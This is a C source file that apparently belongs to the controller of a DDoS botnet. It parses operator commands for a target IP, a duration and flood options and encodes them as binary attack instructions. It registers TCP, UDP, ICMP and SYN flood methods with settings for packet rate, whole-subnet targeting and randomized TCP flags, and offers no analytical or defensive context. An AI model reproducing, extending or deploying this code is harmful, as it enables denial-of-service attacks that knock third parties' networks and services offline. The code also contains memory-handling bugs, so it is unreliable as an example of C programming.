#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

#include "attacks.h"

struct attack_option_t *options;
struct attack_method_t *methods;
int options_len = 0, methods_len = 0;

static char **attacks_split_args(char *s, int *i) 
{
	char *start, **arguments;
  	int state = ' ', len, arg_len = 0;

  	arguments = malloc(MAX_OPTS * sizeof(char *));

  	while (*s)
  	{
  		if (arg_len >= MAX_OPTS)
  			break;

    	switch (state) 
    	{
      		case ' ':
      		{
        		if (*s == '\"') 
        		{
         	 		start = s;
          			state = '\"';
        		} 
        		else if (*s != ' ') 
        		{
          			start = s;
          			state = 'T';
        		}
        	}
        	break;

      		case 'T':
      		{
	        	if (*s == ' ') 
	        	{
	          		len = strlen(start);
	          		arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	          		memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	          		memcpy(arguments[arg_len], start, len - strlen(s));
	          		arguments[arg_len][len - strlen(s)] = '\0';
	          		arg_len++;
	          		state = ' ';
	        	} 
	        	else if (*s == '\"') 
	          		state = '\"';
	        }
        	break;

      		case '\"':
      		{
        		if (*s == '\"')
          			state = 'T';
      		}
      		break;
    	}
    	s++;
  	}

  	if (state != ' ') 
  	{
   	    len = strlen(start);
	    arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	    memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	    memcpy(arguments[arg_len], start, len - strlen(s));
	    arguments[arg_len][len - strlen(s)] = '\0';
	    arg_len++;
  	}

  	if (i != NULL)
		*i = arg_len;

  	return arguments;
}

static char **attacks_split_opt(char *s, int *i) 
{
	char *start, **arguments;
  	int state = ' ', len, arg_len = 0;

  	arguments = malloc(MAX_OPTS * sizeof(char *));

  	while (*s)
  	{
  		if (arg_len >= MAX_OPTS)
  			break;

    	switch (state) 
    	{
      		case ' ':
      		{
        		if (*s == '\"') 
        		{
         	 		start = s;
          			state = '\"';
        		} 
        		else if (*s != '=') 
        		{
          			start = s;
          			state = 'T';
        		}
        	}
        	break;

      		case 'T':
      		{
	        	if (*s == '=') 
	        	{
	          		len = strlen(start);
	          		arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	          		memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	          		memcpy(arguments[arg_len], start, len - strlen(s));
	          		arguments[arg_len][len - strlen(s)] = '\0';
	          		arg_len++;
	          		state = ' ';
	        	} 
	        	else if (*s == '\"') 
	          		state = '\"';
	        }
        	break;

      		case '\"':
      		{
        		if (*s == '\"')
          			state = 'T';
      		}
      		break;
    	}
    	s++;
  	}

  	if (state != ' ') 
  	{
   	    len = strlen(start);
	    arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	    memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	    memcpy(arguments[arg_len], start, len - strlen(s));
	    arguments[arg_len][len - strlen(s)] = '\0';
	    arg_len++;
  	}

  	if (i != NULL)
		*i = arg_len;

  	return arguments;
}

static char **attacks_split_ip(char *s, int *i) 
{
	char *start, **arguments;
  	int state = ' ', len, arg_len = 0;

  	arguments = malloc(MAX_OPTS * sizeof(char *));

  	while (*s)
  	{
  		if (arg_len >= MAX_OPTS)
  			break;

    	switch (state) 
    	{
      		case ' ':
      		{
        		if (*s == '\"') 
        		{
         	 		start = s;
          			state = '\"';
        		} 
        		else if (*s != '.') 
        		{
          			start = s;
          			state = 'T';
        		}
        	}
        	break;

      		case 'T':
      		{
	        	if (*s == '.') 
	        	{
	          		len = strlen(start);
	          		arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	          		memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	          		memcpy(arguments[arg_len], start, len - strlen(s));
	          		arguments[arg_len][len - strlen(s)] = '\0';
	          		arg_len++;
	          		state = ' ';
	        	} 
	        	else if (*s == '\"') 
	          		state = '\"';
	        }
        	break;

      		case '\"':
      		{
        		if (*s == '\"')
          			state = 'T';
      		}
      		break;
    	}
    	s++;
  	}

  	if (state != ' ') 
  	{
   	    len = strlen(start);
	    arguments[arg_len] = malloc((len - strlen(s)) * sizeof(char *));
	    memset(arguments[arg_len], 0, sizeof(arguments[arg_len]));
	    memcpy(arguments[arg_len], start, len - strlen(s));
	    arguments[arg_len][len - strlen(s)] = '\0';
	    arg_len++;
  	}

  	if (i != NULL)
		*i = arg_len;

  	return arguments;
}

static char *attacks_replace_str(char *string, const char *substr, const char *replacement)
{
	char *tok = NULL;
	char *newstr = NULL;
	char *oldstr = NULL;
	int oldstr_len = 0;
	int substr_len = 0;
	int replacement_len = 0;

	newstr = strdup(string);
	substr_len = strlen(substr);
	replacement_len = strlen(replacement);

	if (substr == NULL || replacement == NULL)
		return newstr;

	while ((tok = strstr(newstr, substr)))
    {
		oldstr = newstr;
		oldstr_len = strlen(oldstr);
		newstr = (char *)malloc(sizeof(char)*(oldstr_len - substr_len + replacement_len + 1));

		if (newstr == NULL)
        {
			free(oldstr);
			return NULL;
		}

		memcpy(newstr, oldstr, tok - oldstr);
		memcpy(newstr + (tok - oldstr), replacement, replacement_len);
		memcpy(newstr + (tok - oldstr) + replacement_len, tok + substr_len, oldstr_len - substr_len - (tok - oldstr));
		memset(newstr + oldstr_len - substr_len + replacement_len, 0, 1);
		free(oldstr);
	}

	free(string);
	return newstr;
}

static int attacks_utils_exists(char *str1, char *str2, int len)
{
	int i;

	for (i = 0; i < len; i++)
	{
		if (str1[i] != str2[i])
			return 0;
	}

	return 1;
}

static int attacks_command_index(char *command, int command_len, char delim)
{
	int i;

	if (command_len <= 0 || command_len >= 512)
		return -1;

	for (i = 0; i < command_len; i++)
	{
		if (command[i] == delim)
			return i + 1;
	}

	return -1;
}

static void attack_options_add(uint8_t id, uint8_t type, char *name, char *desc)
{
	uint8_t name_len = strlen(name), desc_len = strlen(desc);

	options = (struct attack_option_t *)realloc(options, (options_len + 1) * sizeof(struct attack_option_t));
	options[options_len].id = id;
	options[options_len].type = type;
	options[options_len].name = malloc(name_len * sizeof(char *));
	memcpy(options[options_len].name, name, name_len);
	options[options_len].desc = malloc(desc_len * sizeof(char *));
	memcpy(options[options_len].desc, desc, desc_len);
	options_len++;
}

static void attack_methods_add(uint8_t id, char *name, uint8_t options[], uint8_t opts_len)
{
	uint8_t name_len = strlen(name);
	int i;

	methods = (struct attack_method_t *)realloc(methods, (methods_len + 1) * sizeof(struct attack_method_t));
	methods[methods_len].id = id;

	for (i = 0; i < MAX_OPTS; i++)
	{
		if (!options[i])
			break;

		methods[methods_len].options[i] = options[i];
	}
	
	methods[methods_len].name = malloc(name_len * sizeof(char *));
	memcpy(methods[methods_len].name, name, name_len);
	methods[methods_len].opts_len = opts_len;
	methods_len++;
}

int attacks_contains_option(uint8_t opt, uint8_t *opts)
{
	int i;

	if (sizeof(opts) / sizeof(opts[0]) == 0)
		return 0;

	for (i = 0; i < (sizeof(opts) / sizeof(opts[0])); i++)
	{
		if (opts[i] == opt)
			return 1;
	}

	return 0;
}

struct attack_option_t attacks_get_option(char *name)
{
	int i;
	struct attack_option_t null_opt;
	
	for (i = 0; i < options_len; i++)
	{
		if (strcmp(options[i].name, name) == 0)
			return options[i];
	}

	null_opt.id = TYPE_NULL;
	return null_opt;
}

struct attack_option_t attacks_get_option_by_id(int id)
{
	int i;
	struct attack_option_t null_opt;
	
	for (i = 0; i < options_len; i++)
	{
		if (options[i].id == id)
			return options[i];
	}

	null_opt.id = TYPE_NULL;
	return null_opt;
}

struct attack_option_t *attacks_grab_options(int *len)
{
	*len = options_len;
	return options;
}

struct attack_method_t *attacks_grab_methods(int *len)
{
	*len = methods_len;
	return methods;
}

struct attack_method_t attacks_get_method(char *name)
{
	int i;
	struct attack_method_t null_method;
	
	for (i = 0; i < methods_len; i++)
	{
		if (strcmp(methods[i].name, name) == 0)
			return methods[i];
	}

	null_method.id = METHOD_NULL;
	return null_method;
}


char *attacks_command_parse(uint8_t id, char *input, int *out_len)
{
	int args_len, i, q, time, retlen = 0, ip_len;
	char *retval, **args, **ip_split;
	uint16_t time16;
	uint32_t addr;
	struct attack_method_t mthd;

	args = attacks_split_args(input, &args_len);
	if (args_len < 3)
	{
		*out_len = -2;
		return NULL;
	}

	retval = malloc(512 * sizeof(char *));
	if (!retval)
	{
		*out_len = -1;
		return NULL;
	}

	memcpy(retval + retlen, "\x01", 1); // Attack instruction
	retlen += sizeof(uint8_t);

	memcpy(retval + retlen, &id, sizeof(uint8_t)); // Attack ID
	retlen += sizeof(uint8_t);

	ip_split = attacks_split_ip(args[1], &ip_len);
	if (ip_len != 4)
	{
		*out_len = -1;
		return NULL;
	}

	for (i = 0; i < ip_len; i++)
	{
		uint8_t ival = atoi(ip_split[i]);
		memcpy(retval + retlen, &ival, sizeof(uint8_t));
		retlen += sizeof(uint8_t);
		free(ip_split[i]);
	}

	free(ip_split);

	time = atoi(args[2]);
	if (time < 1 || time > 0xFFFF)
	{
		*out_len = -3;
		return NULL;
	}

	time16 = htons(time);
	memcpy(retval + retlen, &time16, sizeof(uint16_t)); // Attack duration
	retlen += sizeof(uint16_t);

	for (i = 0; i < args_len; i++)
	{
		if (i < 3)
			continue;

		int vals_len;
		char **vals;
		struct attack_option_t opt;
		struct attack_method_t mthd;

		vals = attacks_split_opt(args[i], &vals_len);
		if (vals_len != 2)
		{
			for (q = 0; q < vals_len; q++)
				free(vals[q]);
			free(vals);
			continue;
		}

		opt = attacks_get_option(vals[0]);
		if (opt.id == TYPE_NULL)
		{
			char *optret;
			optret = malloc(strlen(vals[0]) * sizeof(char *));
			strcpy(optret, vals[0]);
			for (q = 0; q < vals_len; q++)
				free(vals[q]);
			free(vals);
			*out_len = -4;
			return optret;
		}

		memcpy(retval + retlen, &opt.id, sizeof(uint8_t)); // Option ID
		retlen += sizeof(uint8_t);

		memcpy(retval + retlen, &opt.type, sizeof(uint8_t)); // Option Type
		retlen += sizeof(uint8_t);

		switch (opt.type)
		{
			case TYPE_STRING:
			{
				uint8_t str_len;

				vals[1] = attacks_replace_str(vals[1], "\"", "\0");
				vals[1] = attacks_replace_str(vals[1], "\\r", "\r");
				vals[1] = attacks_replace_str(vals[1], "\\n", "\n");

				str_len = strlen(vals[1]);
				memcpy(retval + retlen, &str_len, sizeof(uint8_t)); // String Length
				retlen += sizeof(uint8_t);
				memcpy(retval + retlen, vals[1], str_len); // String Value
				retlen += str_len;
			}
			break;

			case TYPE_UINT8:
			{
				int val = atoi(vals[1]);
				uint8_t val8;

				if (val < 1 || val > 0xFF)
					break;

				val8 = (uint8_t)val;
				memcpy(retval + retlen, &val8, sizeof(uint8_t)); // 1 byte
				retlen += sizeof(uint8_t);
			}
			break;

			case TYPE_UINT16:
			{
				int val = atoi(vals[1]);
				uint16_t val16;

				if (val < 1 || val > 0xFFFF)
					break;

				val16 = htons(val);
				memcpy(retval + retlen, &val16, sizeof(uint16_t)); // 2 bytes
				retlen += sizeof(uint16_t);
			}
			break;

			case TYPE_UINT32:
			{
				int val = atoi(vals[1]);
				uint32_t val32;

				if (val < 1 || val > 0xFFFFFFFF)
					break;

				val32 = htonl(val);
				memcpy(retval + retlen, &val32, sizeof(uint32_t)); // 4 bytes
				retlen += sizeof(uint32_t);
			}
			break;

			default:
				break;
		}

		for (q = 0; q < vals_len; q++)
			free(vals[q]);
		free(vals);
	}

	*out_len = retlen;
	return retval;
}

void attacks_options_init(void)
{
	attack_options_add(OPT_PORT, TYPE_UINT16, "port", "destination port to attack (random if not set)");
	attack_options_add(OPT_LEN, TYPE_UINT16, "len", "attack payload length (random if not set)");
	attack_options_add(OPT_PAYLOAD, TYPE_STRING, "payload", "attack data payload (random if not set)");
	attack_options_add(OPT_PACKETS, TYPE_UINT16, "packets", "packets to send before re-connecting (unlimited if not set)");
	attack_options_add(OPT_PPS, TYPE_UINT16, "pps", "packets per second (unlimited if not set)");
	attack_options_add(OPT_NOBIND, TYPE_UINT8, "nobind", "if not to bind before connecting. 0 = false, 1 = true (true if not set)");
	attack_options_add(OPT_NETMASK, TYPE_UINT8, "netmask", "flood multiple addresses (netmask=24) (disabled if not set)");
	attack_options_add(OPT_MULTISRC, TYPE_UINT8, "multisrc", "use multiple source ports for flooding. 0 = false, 1 = true (false if not set)");
	attack_options_add(OPT_RANDBITS, TYPE_UINT8, "randbits", "randomly set the tcp bits per packet (ACK,SYN,PSH...) (false if not set)");
	
	printf("[attacks] added %d options\n", options_len);
}

void attacks_methods_init(void)
{
	attack_methods_add(METHOD_TCP, "tcp", (uint8_t[]){OPT_PORT, OPT_NETMASK, OPT_LEN, OPT_PAYLOAD, OPT_PACKETS, OPT_PPS}, 6);
	attack_methods_add(METHOD_UDP, "udp", (uint8_t[]){OPT_PORT, OPT_NETMASK, OPT_LEN, OPT_PAYLOAD, OPT_PACKETS, OPT_PPS, OPT_NOBIND}, 7);
	attack_methods_add(METHOD_ICMP, "icmp", (uint8_t[]){OPT_NETMASK, OPT_PPS}, 2);
	attack_methods_add(METHOD_SYN, "syn", (uint8_t[]){OPT_PORT, OPT_NETMASK, OPT_LEN, OPT_PPS, OPT_MULTISRC, OPT_RANDBITS}, 6);

	printf("[attacks] added %d attack methods\n", methods_len);
}